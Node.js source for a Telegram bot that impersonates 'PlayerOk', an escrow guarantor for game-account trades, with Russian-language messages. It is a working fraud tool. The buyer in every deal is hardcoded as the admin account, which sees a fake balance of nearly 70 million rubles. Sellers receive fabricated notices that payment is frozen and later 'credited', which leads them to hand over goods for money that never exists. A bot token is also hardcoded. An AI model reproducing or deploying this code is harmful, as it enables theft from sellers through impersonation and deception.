const { Telegraf, Markup, session } = require('telegraf');
const http = require('http');

const BOT_TOKEN = process.env.BOT_TOKEN || '8849870102:AAGiJ0uvDWHKAH3sFYCWQECSgJmNFC0zsnY';
const bot = new Telegraf(BOT_TOKEN);
bot.use(session());

const ADMIN = 'k13_way';
const users = {};
const deals = {};

const welcomeText = `👋 *Добро пожаловать в PlayerOk!*\n\n🛡️ *PlayerOk* — ваш автоматизированный торговый гарант. Мы обеспечиваем 100% безопасность сделок 24/7.\n\n• Комиссия сервиса: *1%*\n• Режим работы: *24/7*\n• Модератор: @sw1zyy01\n\n✨ Выберите раздел на панели ниже:`;

const mainKb = Markup.inlineKeyboard([
  [Markup.button.callback('💳 Баланс профиля', 'bal'), Markup.button.callback('🤝 Создать сделку', 'create')],
  [Markup.button.callback('🛡️ Безопасность', 'safe'), Markup.button.callback('👨‍💻 Поддержка', 'supp')]
]);

bot.start((ctx) => {
  const username = ctx.from.username;
  if (username) users[username.toLowerCase()] = ctx.chat.id;
  if (ctx.session) ctx.session = {};
  return ctx.replyWithMarkdown(welcomeText, mainKb).catch((e) => console.log(e));
});

bot.action('bal', (ctx) => {
  const isId = (ctx.from.username || '').toLowerCase() === ADMIN.toLowerCase();
  const text = `💳 *Личный кабинет пользователя* \`@${ctx.from.username}\`\n━━━━━━━ СИСТЕМА ГАРАНТА ━━━━━━━\n💰 *Доступный баланс:* ${isId ? '69 999 999' : '0'}.00 руб.\n🔒 *Заморожено в сделках:* 0.00 руб.\n\n📊 *Статистика на PlayerOk:*\n• Всего операций: *0*\n• Успешных обменов: *0*\n• Открытых споров/арбитражей: *0*\n\n✅ Ваш аккаунт полностью верифицирован.`;
  return ctx.editMessageText(text, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.log(e));
});

bot.action('create', (ctx) => {
  ctx.session = { step: 'partner' };
  return ctx.editMessageText(`🤝 *Инициализация новой сделки* [ШАГ 1/3]\n\n👤 Введите **@юзернейм** продавца, у которого приобретаете товар, текстом прямо в этот чат:`, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
});

bot.on('text', async (ctx) => {
  const username = ctx.from.username;
  if (username) users[username.toLowerCase()] = ctx.chat.id;

  if (!ctx.session || !ctx.session.step) return;
  const txt = ctx.message.text.trim();

  if (ctx.session.step === 'partner') {
    ctx.session.partner = txt.replace('@', '').toLowerCase();
    ctx.session.step = 'title';
    return ctx.reply('📦 *Параметры торговой операции* [ШАГ 2/3]\n\n✍️ Введите название товара (например: _Аккаунт Standoff 2_):', { parse_mode: 'Markdown' });
  }
  if (ctx.session.step === 'title') {
    ctx.session.title = txt;
    ctx.session.step = 'price';
    return ctx.reply('💰 *Финансовые условия сделки* [ШАГ 3/3]\n\n💳 Укажите сумму покупки в рублях (только число):', { parse_mode: 'Markdown' });
  }
  if (ctx.session.step === 'price') {
    const price = parseFloat(txt) || 1000;
    const dealId = Math.floor(100000 + Math.random() * 900000);
    deals[dealId] = { id: dealId, seller: ctx.session.partner, buyer: ADMIN, title: ctx.session.title, amount: price, status: 'pending', b_chat: ctx.chat.id };
    ctx.session = {};

    ctx.replyWithMarkdown(`✨ *Бланк сделки #${dealId} сформирован!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛒 *Роль:* ПОКУПАТЕЛЬ\n📦 *Товар:* ${deals[dealId].title}\n💰 *Сумма:* ${price.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🚀 Предложение автоматически отправлено продавцу @${deals[dealId].seller}...`);

    const tChat = users[deals[dealId].seller.toLowerCase()];
    if (tChat) {
      deals[dealId].s_chat = tChat;
      const propText = `🔔 *Вам поступило предложение о продаже!* (#${dealId})\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${deals[dealId].title}\n💰 *Вы получите:* ${price.toLocaleString('ru-RU')} руб.\n🛒 *Покупатель:* @${ADMIN}\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛡️ *ПРОТОКОЛ БЕЗОПАСНОСТИ:*\n• Вы обязаны фиксировать на видео момент передачи товара.\n• Запрещено уводить покупателя в сторонние чаты.\n• Попытка обмана приведет к блокировке средств.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы согласны открыть сделку под защитой Гаранта PlayerOk?`;
      bot.telegram.sendMessage(tChat, propText, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('🤝 Принять условия', `ok_${dealId}`)]]) }).catch((e) => console.log(e));
    } else {
      ctx.replyWithMarkdown(`⚠️ Продавец @${deals[dealId].seller} еще не активировал этого бота.\n\n*Чтобы пуш долетел прямо в чат:* пусть продавец напишет вашему боту команду \`/start\`, после этого создайте сделку заново.`);
    }
  }
});

bot.action(/^ok_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'accepted';
  d.s_chat = ctx.chat.id;

  bot.telegram.sendMessage(d.b_chat, `🔔 *Продавец @${d.seller} принял условия сделки #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[💳 ОПЛАТА] Ожидание перевода\`\n📦 *Товар:* ${d.title}\n💰 *Сумма:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВнесите оплату с баланса аккаунта для заморозки средств:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('💳 Оплатить сделку балансом', `pay_${d.id}`)]]) }
  ).catch((e) => console.log(e));
  
  return ctx.editMessageText(`🤝 *Вы приняли условия сделки #${d.id}*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📦 *Товар:* ${d.title}\n💰 *Выплата:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n⏳ Ожидайте, пока покупатель @${d.buyer} внесет оплату на счет Гаранта PlayerOk.`, { parse_mode: 'Markdown' }).catch(() => {});
});

bot.action(/^pay_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'paid';

  bot.telegram.sendMessage(d.s_chat, `💰 *Покупатель оплатил сделку #${d.id}! Средства заморожены.*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[📦 ДОСТАВКА] Ожидание отправки\`\n📦 *Товар:* ${d.title}\n💰 *Выплата:* ${d.amount.toLocaleString('ru-RU')} руб.\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🛡️ *НАПОМИНАНИЕ:* Запишите передачу товара на видео.\n\nПередайте товар и нажмите кнопку ниже:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('📦 Товар полностью передан', `sent_${d.id}`)]]) }
  ).catch((e) => console.log(e));

  return ctx.editMessageText(`✅ *Сделка #${d.id} успешно оплачена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n🔒 Средства заморожены на балансе Гаранта PlayerOk.\n\n⏳ Ожидайте, пока продавец @${d.seller} предоставит вам все данные от товара.`, { parse_mode: 'Markdown' }).catch(() => {});
});

bot.action(/^sent_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'goods_sent';

  bot.telegram.sendMessage(d.b_chat, `📦 *Продавец подтвердил отправку товара по сделке #${d.id}!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n📊 *Статус:* \`[🔎 ПРОВЕРКА] Ожидание подтверждения\`\n\nПроверьте полученный товар. Если все работает стабильно, закройте сделку для совершения выплаты продавцу:`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('✅ Подтвердить получение', `end_${d.id}`)]]) }
  ).catch((e) => console.log(e));

  return ctx.editMessageText(`✅ *Уведомление успешно отправлено покупателю.*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы подтвердили передачу товара по сделке #${d.id}.\n\n⏳ Ожидаем финальной проверки со стороны покупателя.`, { parse_mode: 'Markdown' }).catch(() => {});
});

bot.action(/^end_(.+)$/, (ctx) => {
  const d = deals[ctx.match[1]];
  if (!d) return ctx.answerCbQuery('Сделка не найдена.');
  d.status = 'completed';

  bot.telegram.sendMessage(d.s_chat, `🎉 *Сделка #${d.id} завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nПокупатель подтвердил получение. Выплата в размере ${d.amount.toLocaleString('ru-RU')} руб. успешно зачислена на баланс вашего профиля.`, { parse_mode: 'Markdown' }).catch((e) => console.log(e));
  return ctx.editMessageText(`🎉 *Сделка #${d.id} успешно завершена!*\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nВы успешно подтвердили выполнение всех обязательств. Средства переведены продавцу.\n\n✨ Спасибо за доверие к гарант-сервису *PlayerOk*!`, 
    { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ В главное меню', 'menu')]]) }
  ).catch(() => {});
});

bot.action('menu', (ctx) => ctx.editMessageText(welcomeText, { parse_mode: 'Markdown', ...mainKb }).catch((e) => console.log(e)));
bot.action('safe', (ctx) => ctx.editMessageText(`🛡 *Правила безопасности PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\n1. Проводите транзакции исключительно через инлайн-интерфейс Гаранта бота. Прямые переводы лишают вас защиты.\n2. Тщательно проверяйте аккаунты до нажатия кнопки подтверждения. После закрытия сделки средства уходят продавцу безвозвратно.`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.log(e));
bot.action('supp', (ctx) => ctx.editMessageText(`👨‍💻 *Служба поддержки PlayerOk*\n━━━━━━━━━━━━━━━━━━━━━━━━\nЕсли у вас возник спор внутри операции, техническая задержка или вопрос по правилам вывода средств — вы можете открыть Арбитраж.\n\n✍ *Official contact:* @sw1zyy01`, { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('⬅️ Назад в меню', 'menu')]]) }).catch((e) => console.log(e));

bot.launch().then(() => console.log('OK'));

http.createServer((req, res) => {
  res.writeHead(200);
  res.end('OK');
}).listen(process.env.PORT || 3000);
